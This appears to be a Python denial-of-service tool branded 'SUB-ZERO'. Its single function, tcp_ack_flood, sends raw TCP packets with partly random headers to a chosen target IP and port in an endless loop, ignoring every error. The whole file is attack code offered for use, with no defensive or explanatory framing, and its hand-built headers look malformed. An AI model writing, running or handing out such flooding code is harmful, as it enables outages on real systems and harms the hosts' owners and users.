import socket
import random
'''
        ███████╗██╗   ██╗██████╗      ███████╗███████╗██████╗  ██████╗     
        ██╔════╝██║   ██║██╔══██╗     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    
        ███████╗██║   ██║██████╔╝█████╗ ███╔╝ █████╗  ██████╔╝██║   ██║    
        ╚════██║██║   ██║██╔══██╗╚════╝███╔╝  ██╔══╝  ██╔══██╗██║   ██║    
        ███████║╚██████╔╝██████╔╝     ███████╗███████╗██║  ██║╚██████╔╝    
        ╚══════╝ ╚═════╝ ╚═════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     
                                                                                                                                                                     
'''

def tcp_ack_flood(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            ip_header = b"\x45\x00\x00\x28" + random.randbytes(8)
            tcp_header = b"\x00\x50" + random.randbytes(6)
            packet = ip_header + tcp_header
            s.sendto(packet, (target_ip, target_port))
        except:
            pass
